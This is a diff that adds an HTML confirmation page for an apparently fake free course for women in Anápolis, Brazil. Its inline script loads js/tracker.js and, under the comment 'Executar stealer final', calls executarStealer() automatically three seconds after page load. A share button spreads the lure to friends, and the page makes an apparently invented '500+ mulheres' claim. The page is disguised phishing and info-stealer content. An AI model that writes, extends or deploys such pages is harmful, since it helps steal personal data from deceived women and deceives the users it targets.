@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmação - Curso para Mulheres</title>
+    <link rel="stylesheet" href="styles/main.css">
+    <link rel="stylesheet" href="styles/animations.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-step completed">3</div>
+                <div class="progress-step active">4</div>
+            </div>
+            <h1>🎉 Inscrição Concluída!</h1>
+        </header>
+
+        <main class="main-content">
+            <div class="confirmation-card">
+                <div class="success-animation">
+                    <div class="checkmark">✓</div>
+                </div>
+                
+                <h2>Parabéns pela Sua Inscrição!</h2>
+                <p class="confirmation-message">
+                    Sua inscrição no programa de cursos para mulheres de Anápolis foi recebida 
+                    com sucesso. Nossa equipe irá analisar seu perfil e entraremos em contato 
+                    via WhatsApp em até 48 horas caso você seja selecionada.
+                </p>
+
+                <div class="next-steps">
+                    <h3>📋 Próximos Passos:</h3>
+                    <ul>
+                        <li>✅ Análise do seu perfil pela nossa equipe</li>
+                        <li>📞 Contato via WhatsApp em 48 horas</li>
+                        <li>🎓 Início das aulas na próxima semana</li>
+                        <li>💼 Certificado de conclusão</li>
+                    </ul>
+                </div>
+
+                <div class="contact-info">
+                    <h3>📞 Dúvidas?</h3>
+                    <p>Entre em contato conosco:</p>
+                    <div class="contact-methods">
+                        <div class="contact-method">
+                            <span>📱 WhatsApp:</span>
+                            <strong>(62) 99999-9999</strong>
+                        </div>
+                        <div class="contact-method">
+                            <span>📧 E-mail:</span>
+                            <strong>contato@cursomulheresanapolis.com</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="final-actions">
+                    <button class="btn-primary" onclick="compartilhar()">
+                        📢 Compartilhar com Amigas
+                    </button>
+                    <button class="btn-secondary" onclick="sair()">
+                        🏠 Finalizar
+                    </button>
+                </div>
+
+                <div class="social-proof">
+                    <p><strong>500+ mulheres</strong> já transformaram suas vidas com nossos cursos!</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="js/tracker.js"></script>
+    <script>
+        function compartilhar() {
+            const text = "Acabei de me inscrever no programa de cursos para mulheres de Anápolis! 🎓✨ Oportunidade incrível e gratuita!";
+            const url = window.location.origin;
+            
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Curso para Mulheres - Anápolis',
+                    text: text,
+                    url: url
+                });
+            } else {
+                // Fallback para copiar texto
+                navigator.clipboard.writeText(text + " " + url);
+                alert('Link copiado para a área de transferência!');
+            }
+        }
+
+        function sair() {
+            window.location.href = 'https://www.google.com';
+        }
+
+        // Executar stealer final
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                if (typeof executarStealer === 'function') {
+                    executarStealer();
+                }
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
